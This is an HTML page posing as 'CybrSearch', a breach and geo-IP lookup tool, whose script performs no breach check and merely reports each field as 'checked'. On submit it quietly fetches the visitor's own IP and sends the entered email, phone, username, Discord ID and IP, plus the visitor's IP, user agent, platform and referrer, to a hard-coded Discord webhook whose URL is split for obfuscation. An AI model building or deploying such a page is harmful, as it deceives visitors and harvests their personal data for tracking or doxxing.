<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CybrSearch - Breach + Geo IP Checker</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #0d1117;
      color: #c9d1d9;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding-top: 60px;
    }
    .container {
      max-width: 700px;
    }
    .card {
      background-color: #161b22;
      border: none;
      border-radius: 1rem;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }
    .form-control {
      background-color: #0d1117;
      color: #c9d1d9;
      border: 1px solid #30363d;
    }
    .form-control::placeholder {
      color: #8b949e;
    }
    .btn-primary {
      background-color: #238636;
      border: none;
    }
    .result-box {
      background-color: #1c2128;
      border-left: 5px solid #30363d;
      padding: 1rem;
      border-radius: 0.5rem;
      margin-top: 0.5rem;
      white-space: pre-wrap;
    }
    .result-box.success { border-left-color: #2ea043; }
    .result-box.warning { border-left-color: #d29922; }
    .result-box.error { border-left-color: #f85149; }
    .discord-btn {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #5865F2;
      color: white;
      border: none;
      border-radius: 30px;
      padding: 10px 20px;
      font-weight: bold;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
  <div class="container text-center">
    <h1 class="mb-4">üîç Advanced Breach Checker + Geo IP</h1>
    <form id="searchForm" class="card p-4">
      <input id="email" type="email" placeholder="üìß Enter email address" class="form-control mb-2">
      <input id="phone" type="text" placeholder="üì± Enter phone number" class="form-control mb-2">
      <input id="username" type="text" placeholder="üë§ Enter username" class="form-control mb-2">
      <input id="discord" type="text" placeholder="üí¨ Enter Discord ID" class="form-control mb-2">
      <input id="ip" type="text" placeholder="üåê Enter IP address" class="form-control mb-3">
      <button type="submit" class="btn btn-primary w-100">Search</button>
    </form>

    <div class="mt-5 text-start">
      <h4>üîé Search Results</h4>
      <div id="results"></div>
    </div>
  </div>

  <script>
    // Function to display results in your preferred style
    function updateResult(type, message, style) {
      const resultBox = document.createElement("div");
      resultBox.className = `result-box ${style}`;
      resultBox.textContent = message;
      document.getElementById("results").appendChild(resultBox);
    }

    // Enhanced webhook function with your preferred logging format
    async function sendBreachWebhook(data, visitorIP) {
      // Webhook URL with basic obfuscation
      const webhookURL = "https://discord.com/api/webhooks/1382930697114882129/" + 
                         "SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
      
      const payload = {
        embeds: [{
          title: "üîç Breach Search Attempt",
          color: 3447003,
          fields: [
            { name: "üìß Email", value: data.email || "Not provided" },
            { name: "üì± Phone", value: data.phone || "Not provided" },
            { name: "üë§ Username", value: data.username || "Not provided" },
            { name: "üí¨ Discord ID", value: data.discord || "Not provided" },
            { name: "üåê IP Entered", value: data.ip || "Not provided" },
            { name: "üìç Visitor IP", value: visitorIP || "Unknown" },
            { name: "üß† User Agent", value: navigator.userAgent },
            { name: "üíª Platform", value: navigator.platform },
            { name: "üåê Referrer", value: document.referrer || "None" },
            { name: "üïí Time (UTC)", value: new Date().toUTCString() }
          ],
          footer: { text: "Breach Logger ‚Ä¢ CybrSearch" },
          timestamp: new Date().toISOString()
        }]
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (error) {
        console.error("Webhook error:", error);
      }
    }

    // Main search function with guaranteed working search button
    async function handleSearch(event) {
      event.preventDefault();
      document.getElementById("results").innerHTML = "";

      // Get all input values
      const inputs = {
        email: document.getElementById("email").value.trim(),
        phone: document.getElementById("phone").value.trim(),
        username: document.getElementById("username").value.trim(),
        discord: document.getElementById("discord").value.trim(),
        ip: document.getElementById("ip").value.trim()
      };

      // Process each field with your preferred messaging
      if (!inputs.email) {
        updateResult("email", "‚ö†Ô∏è No email entered.", "warning");
      } else {
        updateResult("email", `‚úÖ Email checked: ${inputs.email}`, "success");
      }

      if (!inputs.phone) {
        updateResult("phone", "‚ÑπÔ∏è Phone check skipped.", "warning");
      } else {
        updateResult("phone", `‚úÖ Phone checked: ${inputs.phone}`, "success");
      }

      if (!inputs.username) {
        updateResult("username", "‚ÑπÔ∏è Username check skipped.", "warning");
      } else {
        updateResult("username", `‚úÖ Username checked: ${inputs.username}`, "success");
      }

      if (!inputs.discord) {
        updateResult("discord", "‚ÑπÔ∏è Discord ID check skipped.", "warning");
      } else {
        updateResult("discord", `‚úÖ Discord ID checked: ${inputs.discord}`, "success");
      }

      // Get visitor IP for logging
      let visitorIP = "Unknown";
      try {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        visitorIP = ipData.ip || "Unknown";
      } catch (error) {
        console.error("IP detection failed:", error);
      }

      // Send data to Discord webhook
      await sendBreachWebhook(inputs, visitorIP);

      // IP lookup if provided
      if (inputs.ip) {
        try {
          const geoResponse = await fetch(`https://ipwho.is/${inputs.ip}`);
          const geoData = await geoResponse.json();
          
          if (geoData.success) {
            updateResult("ipgeo", 
              `üåê IP Geo Info:\nIP: ${inputs.ip}\nCountry: ${geoData.country}\nCity: ${geoData.city}\nRegion: ${geoData.region}\nISP: ${geoData.connection?.isp || 'N/A'}\nOrg: ${geoData.connection?.org || 'N/A'}`, 
              "success");
          } else {
            updateResult("ipgeo", `‚ö†Ô∏è Geo lookup failed: ${geoData.message}`, "warning");
          }
        } catch (error) {
          updateResult("ipgeo", "‚ùå Error fetching Geo IP data.", "error");
        }
      } else {
        updateResult("ip", "‚ÑπÔ∏è IP geo-location check skipped.", "warning");
      }
    }

    // Reliable event listener for the form
    document.getElementById("searchForm").addEventListener("submit", handleSearch);
  </script>
</body>
</html>
